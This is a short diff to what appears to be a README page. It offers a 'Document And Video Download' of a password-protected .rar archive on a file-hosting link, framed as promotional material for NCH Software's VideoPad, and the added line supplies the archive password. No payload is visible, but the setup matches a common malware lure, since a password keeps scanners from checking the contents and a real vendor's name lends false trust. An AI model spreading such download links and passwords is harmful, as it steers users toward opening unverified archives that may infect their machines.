@@ -27,3 +27,5 @@
 
 ## [⚡️Document And Video Download](https://evc83.pcloud.com/dpZVCssIVZ3yBswJZbWGkZZTccGv7Z2ZZhsLZZtFwpTpxWHjR0JdYax5JzQpzQkKpV/Promo%20Materials.rar):
 Read more: https://www.nchsoftware.com/videopad/index.html
+
+# Archive password: nchsoftware
